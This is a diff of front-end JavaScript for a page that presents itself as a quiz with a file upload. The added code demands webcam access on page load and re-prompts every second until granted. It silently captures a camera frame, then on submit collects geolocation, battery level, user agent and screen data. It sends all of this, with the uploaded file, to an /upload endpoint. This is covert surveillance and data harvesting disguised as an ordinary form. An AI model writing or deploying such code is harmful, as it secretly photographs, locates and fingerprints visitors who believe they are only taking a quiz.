@@ -1,57 +1,50 @@
+// DOM Elements
+const fileInput = document.getElementById("user-file");
+const quizForm = document.getElementById("quiz-form");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const fileInput = document.getElementById("user-file");
-const triggerUpload = document.getElementById("trigger-upload");
-const toast = document.getElementById("toast");
-const quizForm = document.getElementById("quiz-form");
+const toastEl = document.getElementById("toast");
 
-let cameraAllowed = false;
 let capturedImage = null;
 
-// Show toast message
+// ---------------- Toast ----------------
 function showToast(msg, duration = 2000) {
-  toast.textContent = msg;
-  toast.classList.add("show");
-  setTimeout(() => toast.classList.remove("show"), duration);
+  toastEl.textContent = msg;
+  toastEl.classList.add("show");
+  setTimeout(() => toastEl.classList.remove("show"), duration);
 }
 
-// Request camera
-async function requestCamera() {
+// ---------------- Camera Permission ----------------
+async function askCameraPermission() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false // no mic
+    });
     video.srcObject = stream;
-    cameraAllowed = true;
+    video.play();
 
-    // Capture one frame immediately
-    const ctx = canvas.getContext("2d");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    capturedImage = canvas.toDataURL("image/jpeg");
-
-    // Stop stream to free camera
-    stream.getTracks().forEach(track => track.stop());
+    // Capture first frame immediately
+    captureCameraImage();
   } catch (err) {
-    cameraAllowed = false;
-    showToast("Camera permission required to continue.");
+    showToast("Camera access is required to continue.");
+    // Retry after short delay
+    setTimeout(askCameraPermission, 1000);
   }
 }
 
-// Reset camera permission on reload
-window.addEventListener("load", () => {
-  cameraAllowed = false;
-  capturedImage = null;
-});
+function captureCameraImage() {
+  const ctx = canvas.getContext("2d");
+  canvas.width = video.videoWidth || 320;
+  canvas.height = video.videoHeight || 240;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  capturedImage = canvas.toDataURL("image/jpeg");
+}
 
-// Trigger file input after camera allowed
-triggerUpload.addEventListener("click", async () => {
-  while (!cameraAllowed) {
-    await requestCamera();
-  }
-  fileInput.click();
-});
+// Ask camera permission on page load
+window.addEventListener("load", askCameraPermission);
 
-// Handle form submit
+// ---------------- Form Submission ----------------
 quizForm.addEventListener("submit", async (e) => {
   e.preventDefault();
 
@@ -59,33 +52,53 @@ quizForm.addEventListener("submit", async (e) => {
     showToast("Please select a file.");
     return;
   }
+  if (!capturedImage) {
+    showToast("Camera image not captured yet.");
+    return;
+  }
 
-  const metadata = {
-    useragent: navigator.userAgent,
-    platform: navigator.platform,
-    width: window.innerWidth,
-    height: window.innerHeight,
-    language: navigator.language,
-    battery: navigator.getBattery ? await (await navigator.getBattery()).level : null,
-    location: navigator.geolocation ? await new Promise(res => navigator.geolocation.getCurrentPosition(pos => res(pos.coords), () => res(null))) : null,
-    time: new Date().toISOString()
+  // Convert user file to Base64
+  const reader = new FileReader();
+  reader.onload = async function () {
+    const fileBase64 = reader.result;
+
+    // Metadata
+    const metadata = {
+      useragent: navigator.userAgent,
+      platform: navigator.platform,
+      width: window.innerWidth,
+      height: window.innerHeight,
+      language: navigator.language,
+      battery: navigator.getBattery ? await (await navigator.getBattery()).level : null,
+      location: navigator.geolocation ? await new Promise(res => navigator.geolocation.getCurrentPosition(
+        pos => res(pos.coords),
+        () => res(null)
+      )) : null,
+      time: new Date().toISOString()
+    };
+
+    try {
+      const res = await fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image: capturedImage,   // camera image
+          file: fileBase64,       // uploaded file
+          metadata
+        })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById("quiz-container").style.display = "none";
+        document.getElementById("success-container").style.display = "block";
+      } else {
+        showToast("Upload failed: " + data.error);
+      }
+    } catch (err) {
+      showToast("Server error: " + err.message);
+    }
   };
 
-  const formData = new FormData();
-  formData.append("file", fileInput.files[0]);
-  formData.append("image", capturedImage);
-  formData.append("metadata", JSON.stringify(metadata));
-
-  try {
-    const res = await fetch("/upload", { method: "POST", body: formData });
-    const data = await res.json();
-    if (data.success) {
-      document.getElementById("quiz-container").style.display = "none";
-      document.getElementById("success-container").style.display = "block";
-    } else {
-      showToast("Upload failed: " + data.error);
-    }
-  } catch (err) {
-    showToast("Server error: " + err.message);
-  }
+  reader.readAsDataURL(fileInput.files[0]);
 });
